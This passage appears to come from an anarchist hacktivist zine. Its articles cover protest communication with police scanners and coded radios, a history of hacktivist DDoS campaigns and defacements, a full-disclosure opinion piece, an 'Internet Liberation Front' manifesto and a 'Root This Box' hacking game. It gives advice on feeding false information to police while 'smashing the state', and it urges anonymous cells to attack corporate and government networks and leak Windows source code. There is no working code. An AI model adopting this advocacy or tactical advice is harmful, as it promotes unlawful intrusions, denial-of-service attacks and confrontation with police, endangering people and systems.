throughout\r\nthe days action. A good way to get the codes down is to use your scanner when\r\nyour not under the pressure of police oppression. If it seems as though they are\r\ntalking to fast for you to get everything they are saying, just write down bits\r\nand pieces that you do get and if you don't know what the codes they are using\r\nmean look them up. You should be familiar with the way the radio operators are\r\nused to talking. No radio operator will ever talk using familiar conversation on\r\nthe radio, they will use badge numbers, police codes, and a phonetic alphabet. \r\n\r\nYou should be able to understand what the officers are saying when they use a\r\nphonetic alphabet. The phonetic alphabet is used by communicators all over to\r\nclarify letters and spellings. When listening to the cops they will spell out\r\npeoples names, DOB, license plates, and pretty much everything else you can\r\nthink of using a phonetic alphabet. A copy of the phonetic alphabet can be found\r\nat: hackbloc.org/alxciada/phonetic.txt\r\n\r\nIt's very important that you be discreet when using a scanner. It can easily\r\nmake people think you are a cop or some kind of undercover not worthy of their\r\ntrust. A good idea would be to keep it hidden and run a pair of head phones to\r\nit like a Walkman, this will also allow you to hear it a lot better as it can\r\nget pretty loud on the streets. MAKE SURE the cops don't see the scanner, for\r\nthe person with the scanner will have to help move the bloc away from trouble.\r\nIf the cops identify you as a someone important or taking a leadership role they\r\nwill single you out and try and arrest you. \r\n\r\nWhen the action starts the radio will be going off like crazy. In most cases of\r\na break-away march away from a larger contingent catches the officers off guard.\r\nA common tactic of the police is to trap this group on a smaller side street\r\ncircle them and make arrests. The person with the police scanner has to be aware\r\nof this and watch out for this being setup. Also listen to reports of people\r\nbeing arrested, get their names, DOB, and any info that you think can help their\r\nlegal situation. Make sure if you're staying with the group that you keep on top\r\nof where the front of the group is and where the back is, the cops will announce\r\nthis every few blocks. This is important to make sure that one part isn't\r\nfalling behind of the others.\r\n\r\nOther Communication Techniques\r\n--------------------------------------------------------------------------------\r\nWalkie-Talkies should only be used if no other means of communication are\r\navailable. Walkie-talkie can be monitored very easily, so all important messages\r\nshould be encrypted. Things that relate to your tactics and positions should\r\nalways be said using a code and if possible spread though other means besides\r\nradio. You do not need to encrypt everything, these radios can be used to spread\r\nmessages like calling for a medic, telling the group to stick together, or that\r\nthe police are attacking. Things like this that are not critical to your goal or\r\nthat could hurt your bloc do not need to be encrypted and should be spread to as\r\nmany people as possible to get the help you need. All those who plan on using a\r\nradio should have a one-time-use nick name that will conceal their identity when\r\nusing the radio. Same goes for the code, you should change your code as often as\r\npossible. Obviously the downside of this is that the new code has to be taught\r\nto everyone but it will improve your chances of keeping your communications\r\nsecret. Another good trick is to send false info over the radio, say your going\r\nafter one target while actually going to another. Make it seem like a slip up,\r\nmaybe one member will announce a fake target and another will come on the air\r\nsaying that this is not secure and no more talk about the target should be\r\ndiscussed. Maybe even send a small group in that direction as a distraction.\r\nThis could allow you to catch the police off guard if the cops are listening in,\r\nit could buy you the time you need to make it to your real target unnoticed. \r\n\r\nOne idea that has been very effective in spreading tactical information is\r\nsetting up a tactical short message system (SMS) mailing list to send e-mail\r\nupdates to trusted members of the bloc's cell phones. It has worked very well at\r\nthe Republican National Convention and the Democratic National Convention to\r\nspread tactical information to the different groups. Almost all cell phones have\r\nan e-mail address that you can send short text messages. This can be used to\r\nupdate your fellow freedom fighters with information dealing with police\r\nmovements, or as an alterative to using 2 way walkie-talkie. Your phones e-mail\r\naddress will be your 10 digit phone number @ and address based on your provider.\r\nAn example for verizon cell phones it will be [10 digit phone number]@vtext.com.\r\nIf you don't know what your phones e-mail address is here is a short list of\r\ncommon providers.\r\n\r\nAT&T - @mobile.att.net\r\nCingular - @mobile.mycingular.com\r\nNextel - @messaging.nextel.com\r\nSprint - @messaging.sprintpcs.com\r\nT-Mobile - @tmomail.net\r\nVerizon - @vtext.com\r\n\r\nThe idea would be to have a mailing list where one use can send a message to an\r\naddress which in turn would send it to all the members of the bloc who are\r\nregistered on this list. If you are in a really large bloc you can set up a\r\ncluster mailing list where each affinity group could have their own mailing\r\nlist, say group1@mailinglist.net group2@mailinglist.net group3@mailinglist.net..\r\nThose address will be registered on another mailing list say\r\nbloc@mailinglist.net so that messages that only concern a certain group can stay\r\nwithin the group while larger messages that effect everyone can be sent to all\r\nthe entire bloc using the bloc@mailinglist.net.\r\n\r\nIf you change your mailing list address often and verify all those on the list\r\nthe chance of police intercepting your tactical information is largly reduced.\r\nThe downside is of course the amount of time it takes to type and send a message\r\nusing a cell phone might not be avalible when your smashing the state, thats why\r\nother forms of communication should still be used.\r\n\r\nThis article only touches the surface of how we can improve our communication\r\nand information gathering skills, tips discussed in this article are just the\r\nbeginning. To pose a real threat to the powers of the state we must spend more\r\nof our time training for upcoming actions. Our enemies take training very\r\nseriously and so should we. We should start training people to use a wide range\r\nof equipment and skills. Not only those discussed in this article but what ever\r\nyou can think of to keep our tactics new and creative. The more random our\r\ntactics seem the less the police can prepare to counter them. This way, next\r\ntime we meet the cops in battle, they wont know what hit them.\r\n\r\n################################################################################\r\n#   18. Beyond Physical Borders: Hacking and Activism on the Net   by Fetus    #\r\n################################################################################\r\n\r\nThe combination of activism, the Internet and hacking is hacktivism; its\r\nabstract can be partially defined in the \"hacker ethic,\" as described in Steven\r\nLevy's Hackers: \r\n\r\n1)   Access to computers- and anything which might each you something about the\r\nway the world works should be unlimited and total. Always yield to the Hands-On\r\nImperative!\r\n2)   All information should be free.\r\n3)   Mistrust Authority - Promote Decentralization\r\n4)   Hackers should be judged by their hacking, not bogus criteria such as\r\ndegrees, age, race or religion.\r\n5)   You can create art and beauty on a computer.\r\n\r\nFree information, although described by Levy as an ethic, is more precisely a\r\ncore value for which the hacker ethic achieves. It demands uncompromised\r\navailability. However there are forces opposing its existence. Companies and\r\ngovernments are threatened and have responded to hackers by attacking networks\r\nof free communication as they progress toward the free information movement.\r\nHacktivism is the active struggle to materialize free societies as described by\r\nthe hacker ethic.\r\n\r\nThe concept of unlimited computer access for the sake of learning (the first\r\nhacker ethic) is manifested by a variety of organizations. Such examples are\r\nfree softwares, education, music and free network availability. These\r\ncollectives naturally adhere to the fundamental belief that all information\r\nshould be free (the second hacker ethic). \r\n\r\nThe free software movement has its roots with Richard Stallman. He developed\r\nGNU, which stands for \"Gnu's Not Unix. GNU is a model for software developers to\r\nrelease their code free from the threat of privatization. This is done under the\r\nGeneral Public License, or the GPL. According to the website, the GPL is\r\nconstructed to assure that software developers \"have the freedom to distribute\r\ncopies of free software, receive source code, and change the software or use\r\npieces of it in new programs. The GPL assures that this is accomplished by\r\nspecifically stating: \r\n\r\n1) Changes to existing free software must be made known to its recipient that it\r\nwas modified.\r\n2) All softwares released under the GPL \"must be licensed for everyone's free\r\nuse or not licensed at all.\r\n\r\nThe successes of the open source movement have inspired programmers to release\r\ntheir code under the GPL. For example, sourceforge.net provides an opportunity\r\nfor people to release their projects (which currently numbers at 99,572) freely.\r\nOther institutions have adapted the open source GPL model.  The online free\r\nencyclopedia Wikipedia encourages people to contribute and edit its contents\r\nimplementing democratic methods such as page history and discussion. \r\n\r\nUniversities are also contributing to the open source movement by releasing all\r\ncourse materials and lectures free of charge. For example the Open Course Ware\r\nproject at MIT has set a new standard for higher education. Charles Vest,\r\nPresident of MIT, in the annual report explained that:\r\n\r\n\"The computer industry learned the hard way that closed software systems - based\r\non a framework of proprietary knowledge - did not fit the world they themselves\r\nhad created. The organic world of open software and open systems was the true\r\nwave of the future. Higher education must learn from this. We must create open\r\nknowledge systems as the new framework for teaching and learning.\"\r\n\r\nAlthough these intuitions have taken the initiative to spread the benefits of\r\nopen source, giant corporations (and governments alike) are vehemently fighting\r\nits development. A major milestone case is SCO vs. IBM. Stephen Shanklan, staff\r\nwriter of CNET News.com reported that SCO, the \"inheritor of the intellectual\r\nproperty for the Unix operating system has sued IBM for more than $1 billion.\"\r\nChris Sontag, Senior Vice President of SCO claimed that IBM \"has contaminated\r\ntheir Linux work with inappropriate knowledge from Unix.\" However, SCO does not\r\nstand unsupported in this legal battle. Microsoft, a multibillion-dollar\r\nsoftware corporation and an advocator of proprietary source code, had been\r\nfinancially backing SCO's legal defense. In another article, Stephen Shanklan\r\nreported that Microsoft gave a total of $16.6 million dollars to SCO \"for a Unix\r\nlicense, according to regulatory filings.\" Corporations like Microsoft and SCO\r\nare using their economic superiority to undermine the free-software movement\r\nbecause it threatens their profit in the industry. \r\n\r\nCorporations are not the only entity working against the free information\r\nevolution. The U.S. Department of State, in a release made by the Bureau of\r\nDemocracy admits that the Chinese government:\r\n\r\nContinued to suppress political, religious and social groups, as well as\r\nindividuals, that it perceived to be a threat to regime power or national\r\nstability. The Government's human rights record remained poor, and the\r\nGovernment continued to commit numerous and serious abuses. It refused to allow\r\nsocial, political or religious groups to organize or act independently of the\r\nGovernment and the Communist Party. Those who tried to act independently were\r\noften harassed, detained or abused by the authorities.\r\n\r\nNick Mathaison, a writer for the Observer reported Microsoft sold technology\r\nused to censor the Internet to the Chinese government. It has \"resulted in the\r\njailing of its political opponents\" Mathaison continues to explain that Amnesty\r\nInternational \"has cited Microsoft for helping fuel 'a dramatic rise in the\r\nnumber of people detained or sentenced for internet-related offences'.\"  \r\n\r\nIn its press release, Microsoft declared that it signed an agreement with the\r\nChinese authorities to \"provide national governments with controlled access to\r\nMicrosoft and Windows source code.\" The agreement called \"Government Security\r\nProgram\" is \"tailored to the specialized security requirements of governments\"\r\nthat permit them to control information in an \"appropriate way.\" In addition to\r\n\"controlled access,\" the GSP agreement allows the participating government to\r\n\"undertake research projects in the field of information security.\" This means\r\nthat the Chinese government can spy (and punish) on its people using Microsoft\r\nproducts. Microsoft has profited from the deprivation of first amendment rights\r\nof the Chinese people. \r\n\r\nHackers have declared the inherent mistrust of authority figures because of\r\nrepressive actions of large corporations and governments. The hacking community\r\nhas responded by innovating tools to counter cyber oppression to bypass\r\ncensorship. Hackers and activists are working together to apply civil\r\ndisobedience tactics on the internet. The \"Hands-On Imperative\" is\r\nre-appropriated to \"direct action\" which generates activity liberating the\r\npeople and the same time challenging the law. \r\n\r\nHackers have been able to overcome censorship by creating decentralized content\r\ndistribution networks. These networks remain anonymous and secure because it\r\nrequires all users in the network to share data in small parts. Many programs\r\nhave emerged such as \"peekabooty,\" \"six/four\" and \"Freenet.\" According to\r\nsourceforge.net, a website that fosters the open source community, \"Freenet is\r\nfree software designed to ensure true freedom of communication over the\r\ninternet. It allows anybody to publish and read information with complete\r\nanonymity.\" \r\nIn addition to developing technology to defend freedom on the Internet, hackers\r\nhave staged attacks against those responsible for oppression. Tim Jordan\r\ninsightfully states, \"The rise of hacktivism has not superseded or destroyed\r\nprevious hacker politics, but has reconfigured it within a broader political\r\nlandscape\" (2002). The Critical Arts Ensemble (CAE) was established in 1994\r\narguing that the onset of the Internet will create a space in which physical\r\nlaws becomes an ineffective means of enforcement. The CAE states, \"Elite power,\r\nhaving rid itself of its national and urban bases to wander in absence on the\r\nelectronic pathways, can no longer be disrupted by strategies predicted upon the\r\ncontestation of sedentary forces (Jordan 2004).\" Groups like the CAE are\r\ncoinciding online protests with street actions.\r\n\r\nThe power now lies in computer networks. It is in the form of \"Electronic Civil\r\nDisobedience (ECD).\" The \"nomadic\" power of the corporation must be fought\r\nagainst on the Internet. The CAE believes that:\r\n\r\n\"The expertise hackers develop in the technologies of cyberspace can offset the\r\nimbalance of power that activists are seeking to redress. ECD magnifies its\r\neffects not by increasing the numbers of bodies involved in protests but by\r\nusing the expertise of hackers to increase their political effects.\" (Jordan\r\n2005)\r\n\r\nWithin two years of the CAE's call for the politicization of hackers, they\r\ndeveloped a \"theory and artform all in one.\" It was called Floodnet. Floodnet\r\nwas developed by \"four artist-hacker-activists\" under a new group called the\r\n\"Electronic Disturbance Theatre\" (EDT). Stalbaum explained that Floodnet is an\r\n\"example of conceptual net.art [sic] that empowers people through\r\nactivist/artistic expression.\" According to the CAE's website, Internet Surfers\r\nin support of the \"digital resistance\" against globalization can simply click on\r\na link, leave the browser open, and the Floodnet Applet will \"automatically\r\nreload the target web page every few seconds (Stalbaum).\"\r\n\r\nThe CAE first launched their Floodnet tools against websites connected to\r\n\"Mexican neo-liberalism\" in solidarity with the Zapatista resistance. The\r\nactions were defined as a \"virtual sit-in,\" which parallel action in the\r\nstreets. The Floodnet script deliberately makes an invalid request using\r\nkeywords such as \"human_rights.\" The targeted server will then respond with\r\n\"human_rights not found on this server (Stalbaum).\" Other hacking groups\r\nincluding the Electrohippies Collective also launched similar floodnet attacks\r\non groups like the World Trade Organization to coincide with major street\r\nactions. The ehippies \"claimed that the action was successful with the WTO\r\nconference networks being constantly slowed, brought to a complete total halt on\r\ntwo occasions and with 450,000 people participating over five days.\r\n\r\nThis sort of online direct action is disputed as \"hacktivism\" by Oxblood Ruffin,\r\na prominent member of the Cult of the Dead Cow. Oxblood claimed in a speech at\r\nthe CyberCrime and Digital Law Enforcement Conference at Yale Law School that\r\n\"DoS' (denial of service) attacks (carried out by the CAE, EDT, and ehippies)\r\n\"smelled like the same cheap hacks were being elevated to political street\r\nprotests when they weren't more than script kiddy antics in drag.\" He declared\r\nthat \"digital disobedience or cyber sit-ins\" were not synonymous with\r\nhacktivism.\r\n\r\nInstead Ruffin came up with a modified form of Richard Stallman's GPL known as\r\nthe \"Hacktivismo Enhanced Source Software License Agreement.\" HESSLA uses the\r\nUniversal Declaration of Human Rights (UDHR) as the basis of its philosophy. The\r\nUDHR was developed in 1948 in the General Assembly of the United Nations to\r\navoid the atrocities committed during World War II. Its main principles are: \r\n\r\nThe HESSLA license follows the declaration that:\r\nBoth Hacktivismo and its end-users to go to court if someone tries to use the\r\nsoftware in a malicious manner, or to introduce harmful changes in the software.\r\nIt also contains more robust language than has previously been used to maximize\r\nenforcement against governments around the world.\r\n\r\nAny government or institution guilty of human rights violations can be\r\nprosecuted if caught using software with this license. Although this license has\r\nnever debut in the court systems, it remains a symbolic act of the hacktivist\r\nand has sprouted in other scalable and effective forms. \r\n\r\nHowever, many hackers feel that the GPL and HESSLA license do not go far enough\r\nin defending the open source movement. Corporations like SCO and Microsoft are\r\nactively working together to sue major distributors of Linux. Because of their\r\neconomic advantage and influence in the court system, they have been successful\r\nin bringing charges against the Linux community for allegedly stealing portions\r\nof \"copyrighted\" SCO UNIX source codes. Hackers, left with no other voice, have\r\ntaken matters in their own hands by directly attacking SCO servers. Tactics have\r\nstarted out with simple DDOS attacks which shut down severs for periods of time\r\n(Wagner) but have evolved into more complex attacks such as website defacements\r\n(Barr) and even worms and viruses infecting hundreds of thousands of computers\r\nto attack SCO servers (Hines). The actions of SCO have radicalized hackers to\r\ntake actions in more ways than distributing free code.  \r\n\r\nMore aggressive forms of hacktivism have emerged in the Middle East conflict.\r\n\"There has been a massive increase in online activities, particularly in\r\nrelation to the conflict in Palestine and Israel (and more recently associated\r\nwith 9-11), which has been labeled 'e-jihad',\" explains Gary Bunt. \"E-jihad\" is\r\nan electronic version of the holy war representing the struggle of good over\r\nevil. The \"massive increase in online activities\" is cyber warfare. It wholly\r\nrejects the \"digitally correct\" philosophy and has taken the hacker ethic of the\r\n\"hands-on imperative\" or \"direct action\" to its final step. \r\n\r\nThe Pro-Palestinian hacking group,\"World's Fantabulous Defacers\" (WFD) was\r\nresponsible for hundreds of web defacements against Israeli, Indian, Taiwanese,\r\nYugoslavic and the online bank Karachi website. Their most notorious attack was\r\nagainst the Israeli Prime Minister Ariel Sharon's election campaign website in\r\n2001. They posted grotesque images of \"a badly scarred child whose horrific\r\ninjuries were the result of his house being 'burned down by illegal Jewish\r\nsettlers in the West Bank'.\" They explained their actions that:\r\n\r\nWe are no heroes but merely hackers while we understand that it is not feasible\r\nfor us to successfully make a legitimate difference in oppressed and tortured\r\nlives in Palestine we will continue to deface, not destroy, for the cause until\r\nthere is reform until there is change until all suffering children in the world\r\ncan wake up to a world of peace, not a world of death, destruction, and chaos, a\r\nworld devoid of war.  (Bunt) \r\n\r\nThey included links to the Intifada (translated uprising) Online, Palestinian\r\nInformation Center, and the Islamic Association for Palestine.\r\n\r\nOther Muslim hacking groups have started organizing against Israeli and Indian\r\nsites by working with various hacking groups and distributing hacker tools.\r\nTheir actions range from politically motivated hacks to shout-outs to other\r\naffiliated groups. One such Muslim hacking group is called \"The Muslim Hacker's\r\nClub\" (MHC). In addition to distributing viruses and flood tools, Alldas.org\r\n\"logged 28 hacking attacks linked to the MHC\" against commercial Indian sites\r\n(Bunt). Another notorious group was called the \"Silverlords.\" Alldas.org\r\ndocumented 1,436 defacements from November 2000 to April 2002. In their major\r\ndefacement of paintcompany.com, they \"presented a pro-Kashmiri page, with\r\ngraphic photographs of human rights violations.\" They quoted, \"STOP THE INDIAN\r\nGENOCIDE AGAINST THE PEOPLE OF KASHMIR. FREE KASHMIR, PALESTINE END THE INJUST\r\nU.N SANCTIONS ON IRAQ.\" \r\n\r\nThe hacking group GFORCE was another accomplished collective. They were known to\r\nhave hacked the US Defense Test & Evaluation Processional Institute (DTEPI) in\r\nSeptember 2000. They replaced the site's content with very strong messages and\r\nphotos of Palestinian children being killed by the Israeli troops. Their ending\r\nstatement explains their call for an e-jihad: \r\n\r\n\"We have suffered throughout the wages and will suffer no more. This is the era\r\nof cyberwarefare, where once again the Muslims have prevailed. We will not rest\r\ntill every node, every line, every bit of information contained in our\r\nsuppressors has not been wiped out, returning them to the dark ages. We will not\r\ntolerate anymore, and we will not fail.\" (Bunt)\r\n\r\nGFORCE also hacked other \"US government agencies, military and other targets via\r\nTaiwan-based platforms.\" GFORCE was the most \"prominent group of hackers to have\r\nemerge from Pakistan (Dr. Nuker, Pakistani Hackerz Club).\" \r\nThe hacking group UNITY have increased militancy under the potent cyber Islamic\r\nideology - hacking under the \"iron guard banner.\" They advocated penetrating the\r\n\"enemy's network\" and \"planting code\" to cause direct infrastructure damage in\r\nwhat they perceive as online war. UNITY described in systematic format in their\r\nhacking strategy. It follows: \r\n\r\n1) Disabling official Israeli government sites.   \r\n2) Crashing financial sites. \r\n3) Knocking out main Israeli ISP servers.\r\n4) Blitzing major Israeli e-commerce sites causing transaction loss. \r\n\r\nUNITY believes that \"the more money they (Israeli cyber fronts) lose in fixing\r\nand strengthening their systems means less money to buy bullets and rockets for\r\nuse against our children.\"  Gilad Rabinovich, CEO of the Israeli ISP Netvision\r\nsaid, \"All Israeli ISPs have been overloaded with data\" and confessed that \"we\r\nare just the only ones to admit it.\" In addition to being \"overloaded with data\"\r\nthe CEO continues that if the cyber war were to continue \"it will steal\r\nresources from us and hurt customers. (Gambill)\" \r\n\r\nIn order to be effective, it is imperative that all aspects of hacktivism is\r\nembraced; promoting free decentralized information networks as well as taking\r\ndirect action against those responsible for violating digital and human rights.\r\nThe materialization of a free society requires the systematic destruction of\r\noppressive forces working against the free flow of information. The internet is\r\nnot free; it is made free by those who are willing to fight to protect it.\r\n\r\n################################################################################\r\n#                   19. White and Black   By shardz@dikline                    #\r\n################################################################################\r\n\r\nThis paper is designed to explain to people how the security industry works and\r\nwhy black and white hats both need each other. First off for those of you that\r\nsay you are gray hats, there is no gray hat. Gray hat is white hat, the issue is\r\nquite literally black and(or in this case) white. I'm not going to claim either\r\nto work for \"the industry\" as a white hat. Nor will I claim to be part of the\r\nblack hat scene, but anywayz let's get started. \r\n\r\n--------------------------------------------------------------------------------\r\nWhite\r\n--------------------------------------------------------------------------------\r\nWhite hats certainly need black hats because without them there would not be a\r\nsecurity industry. Also when I say \"white hat\" I dont mean sys-admins because\r\nsys-admins are just doing their job. Im talking about people like Lance Spitzer\r\n(Project Honeynet), or David Litchfield, who I like some of the papers of I just\r\ndont think when he talks about SQL passwords and how to crack them, he should\r\nwrite an accompanying tool that will be most likely used by script kids than\r\nsys-admins. Lists like BuqTraq and other full disclosure lists have to be the\r\nmost counter productive things ever created, but the also prove the point that\r\nwhite hats need black hats. Lists like the aforementioned do more harm than\r\ngood, the number of script kiddies that are nurtured and encouraged by these\r\nlists far out weighs the number of patches written and holes closed. However\r\nwithout such support such lists would quickly become irrelevant since noone\r\nwould be hacking boxes, security would no longer be an issue. If people simply\r\nstopped posting to such lists and followed a path of non disclosure and report\r\nbugs directly to the vendors (or keep them private =)) security would improve\r\ndrastically since kiddies would have nothing to feed off of, thus reducing the\r\nattacks. Personally I think projects like pr0j3kt m4yh3m are a rude alert to the\r\nwhite hats that something is terribly awry. Its sad to think that they in their\r\nself righteous journey to \"secure\" the internet, that they are the ones helping\r\nto make it less secure. Either that or they're in it for the money and know\r\nexactly what their doing, I believe its a combination of the both moreso the\r\nlatter than the former. \r\n\r\n--------------------------------------------------------------------------------\r\nBlack\r\n--------------------------------------------------------------------------------\r\nBlack hats, atleast true black hats, don't need white hats in any sense. However\r\nif you use a loose interpretation of the term they do, and for this paper black\r\nhat will encompass script kiddies as well as the people at the darkest ends of\r\nthe spectrum. By ignoring the truely talented black hats and focusing more on\r\nthe kiddies the bond between black and white will become clear. Script kiddies,\r\nin their early stages of messing with computers, thrive on white hat mailing\r\nlists like BugTraq for their infoz. These lists dumb down every topic and make\r\ntools simple enough for them to use on a mass scale. They then go and use these\r\ntools to hack computers and leave defacements, or install psyBNCs, or whatever.\r\nThen all of the sysadmins that get owned for not patching their systems within\r\n37 seconds of the BugTraq post complain that the security industry sucks and is\r\ninsecure. Then a huge amount of money is spent to research and discover security\r\nbugs. These bugs are then posted to a security mailing list where, script\r\nkiddies gather tools and infoz and hack more computers. Its a vicious circle\r\nthat has snowballed out of control. I dont think anyone really learns from these\r\nlists: in theory these lists are meant to benefit security by applying pressure\r\nto the vendors to patch their systems. Which it does, however the number of\r\nsysadmins that avidly read this list are so few that the list is fairly\r\ninefficent. Therefore many systems are left unpatched and now many kiddies have\r\na tool they can use to exploit them. The true blackhat hackers that code their\r\nown exploits paradoxially enough help the security industry more than the full\r\ndisclosure white hats. This is because a single blackhat or even a group of ten\r\nwith a unreleased exploit will do far less damage than the numerous script\r\nkiddies with a publically disclosed exploit. The blackhats that don't disclose\r\ntheir exploits may not be helping security 100% but they are doing more good by\r\nkeeping their exploits private. The chances of sysadmins getting hacked by a\r\nhandful of black hat hackers with an exploit is far less than these sysadmins\r\ngetting owned by a script kiddie with a tool they ripped off some list. \r\n\r\n--------------------------------------------------------------------------------\r\nConclusion\r\n--------------------------------------------------------------------------------\r\nThe real threat when the media, the anti-virus companies, or whoever, mentions\r\n\"hackers\" who they really mean are kids with tools they discovered off of full\r\ndisclosure lists. Anti-Virus/Security industry is a multi million dollar\r\nindustry that thrives on its colleagues doing security \"research\", and releasing\r\nbugs that kiddies of the virus world can write a devastating worm so that the\r\npublic will buy their product. But you might ask if the vulnerabilities were\r\nknown about how come the worm or whatever was so devastating? Because people\r\ndont patch thier systems. Almost any security breach can be boiled down to an\r\nerror between the keyboard and the chair. Theoratically if Joe Blow subscribed\r\nto BugTraq and patched his systems as the bugs came out full disclosure would be\r\na wonderful system. However the public does not subscribe to BugTraq even most\r\nsysadmins don't carefully moniter the integrity of thier systems, that would be\r\na 24 hour a day job. Black hat hackers are not the problem its the industry\r\nitself and the white hat full disclosure mentality. And since the industry is\r\nspawning legions of \"hackers\" a day they will never go away. Thus the industry\r\nis the only problem in this equation that can be solved. The kiddies arent going\r\naway. The blackhats aren't disclosing. But the white hats seem to be the root of\r\nall the problems. After reading this paper you may be wondering where my stance\r\nis, what \"hat\" I wear since before I said I was neither a white hat or a black\r\nhat. And the answer is, rogue hat. A rogue is simply a hacker that looks out for\r\nhimself, and their group. We don't have stereotypical agendas. We are not in it\r\njust to learn, or to help improve security. We are not in it to cause mayhem or\r\nmake money. We are simply in it. Finally I will leave you all with a question.\r\nSince when did we start calling the security \"scene\" an industry?\r\n\r\n                                 shardz@dikline\r\n                                     __/\\__ \r\n                                     \\ \\/ /\r\n                                     /_/\\_\\ \r\n                                       \\/\r\n \r\n################################################################################\r\n#         20 Autonomous Hacktivism With the Internet Liberation Front         #\r\n################################################################################\r\n\r\nIn the online struggle for social justice, many of our comrades have fallen\r\nvictim to law enforcement. In order for us to remain effective, we need to find\r\nways of clearing ourselves of becoming targets of harassment from the rich and\r\npowerful. To continue to question and confront the established order, we need to\r\nexplore more secure models of radical organizing.\r\n\r\nAs part of adopting security culture and becoming anonymous, we need to organize\r\nourselves in a decentralized way to prevent the ability for single people being\r\nbusted not take down the entire group. The Internet Liberation Front(ILF), like\r\nthe Animal and Earth Liberation Front before it, is a tactic to take action\r\nanonymously yet still connect with larger and broader social movements. Several\r\nILF cells operating independent of each other with different goals but under the\r\nsame points of unity allows a diversity of tactics as well as empowering others\r\na way of tuning in and joining the struggle.\r\n\r\nWhile the proposed points of unity can serve as a useful guideline for people\r\nwho are organizing their own hacktivist cells, it is by no means a strict code\r\nwhich demands obedience. People are free to use and reuse this code as they see\r\nfit, and are free to make modifications and reuse the name if it suits their\r\npurposes. Hacktivists of world, unite! \r\n\r\n                            !!!!!!!!!!!!!!!!!!!!!!!\r\n                            ! ILF POINTS OF UNITY !\r\n                            !!!!!!!!!!!!!!!!!!!!!!!\r\n\r\n1. We recognize that the established order of corporations and governments stand\r\nin the way of achieving an open internet and a free society.\r\n\r\n2. We utilize a diversity of tactics in achieving our goals, ranging from\r\ndigital rights hacktivism like building and protecting alternative channels of\r\nfree secure communication as well as direct action hacktivism against those who\r\nare actively working against a free internet.\r\n\r\n3. We need to break out of the digital realm and coordinate with and participate\r\nin political protests around the world. Our resistence must by global: on the\r\nstreets and on the net!\r\n\r\n4. The very interest in the subject will label yourself as a criminal in the\r\neyes of the state. To protect yourself and others in the movement, we need to\r\nfacilitate and build a culture of security. Organize in a decentralized\r\nanonymous way, communicate securely, don't rat on others, and become a ghost.\r\n\r\n5. The Internet Liberation Front belongs to nobody and everybody. Anyone who are\r\nacting under these points of unity are considered an operative of the ILF, and\r\nare free to utilize and build upon the name and ideals. \r\n\r\nA scenerio: Microsoft is hired by the Chinese government to develop systems that\r\nblock political websites. First, digital rights hacktivists circumvent their\r\ncensorshipby developing open publishing software(like Freenet, IndyMedia, and\r\nfile sharingservices) so we can communicate securely and anonymously. Then\r\ndirect actionhacktivists orchestrate attacks on both Microsoft and Chinese\r\ncomputer networkswhile publically releasing the source code to the Windows\r\noperating system. Press releases are sent out to the media. The birds chirp.\r\nThe sun rises.\r\n\r\n################################################################################\r\n#                            Right-wing Subversion                             #\r\n################################################################################\r\n\r\nScattered throughout this issue is a series of graphics advocating random acts\r\nof destruction and violence.

At the end\r\nof the month, the final scoreboard and team rankings are archived and reset as\r\ncontrol over the servers are returned to their original owner to reconfigure and\r\nrerelease. \r\n\r\nHow do you play?\r\n--------------------------------------------------------------------------------\r\nThe object of the game is to be hack and take over a system and gain enough\r\naccess to modify the hack.html static page in the web root. You have to update\r\nthis file with the name of your team and your message to the world. For a\r\nworking hack.html page, check out our example. Our scripts parse these files on\r\nan hourly basis and update your team scores in our database. From here, you have\r\nto defend the box against other teams who are also trying to take over. The\r\nlonger you hold the most amount of boxes, the more points you get. \r\n\r\nBox Submissions\r\n--------------------------------------------------------------------------------\r\nThe servers in this competition are submissions from users just like you. If you\r\nhave an extra machine of any kind that you can throw on a network somewhere,\r\nconsider setting it up for Root This Box! We like a diversity of configurations,\r\nhardware specs, and operating systems. Some box owners like to intentionally\r\nplant vulnerabilities, backdoors, or outdated software just to make the game\r\nmore interesting. If you are interested in submitting a machine, please read the\r\nsetup guide for specific details on how to configure your box for the\r\ncompetition. \r\n\r\nHow to Set up a machine for Root This Box\r\n--------------------------------------------------------------------------------\r\nThe game depends on having boxes set up and supplied from users just like you.\r\nIf you have a spare machine lying around near a stable internet connection,\r\nconsider submitting your box for the challenge. This guide will provide you with\r\nspecific details and requirements for setting up a system to be entered in the\r\nRoot This Box competition. \r\n\r\nSystem Requirements\r\n--------------------------------------------------------------------------------\r\nWhile you are encouraged to try a diversity of operating systems and\r\nconfigurations, there are some standards that need to be respected in order for\r\nit to work properly in our challenge. You are required to have a static IP\r\naddress or host or some sort of dyndns.org service. You are also required to run\r\nsome sort of web service on port 80 that can deliver html files. If you are\r\nbehind any sort of router or firewall, you need to make sure that it is\r\nconfigured to forward traffic (on at least the ports for the services you want\r\nto be running) to your box's local IP address so people can connect in. The\r\nmachine should be hosted on a relatively speedy and stable internet connection\r\nand should be running as much as possible. You also need to put a static html\r\npage in your web root called hack.html which our scripts will crawl and parse on\r\nan hourly basis for scoring purposes. This contains information like who is\r\ncurrently owning the box and what services are running. \r\n\r\nFun Options\r\n--------------------------------------------------------------------------------\r\nSetting up a box and closing all services is no fun. Many people are putting\r\ntogether various configurations and even known vulnerabilities for users to play\r\nwith. Of course, you are free to set up the box however you please, but we have\r\na few recommendations. Many people are creating low level accounts and allowing\r\nusers to ssh or ftp into the box to have at least a low level of access to play\r\naround with and to launch further attacks which may elevate permissions. If you\r\nchoose this route, make sure you set up a cron to reset the pass back to it's\r\ndefault every five minutes or so otherwise someone is going to set it to\r\nsomething else and no one else can connect.

If you have anything to share about the\r\nlatest exploits, hacktivist actions, or any other happening in the scene, send\r\nit in! We accept a variety of different mediums: from writings, images, ascii\r\nart, links, technical documents, etc. There are a number of ways you can get\r\ninvolved, from submissions to grammar/editing or graphic design.

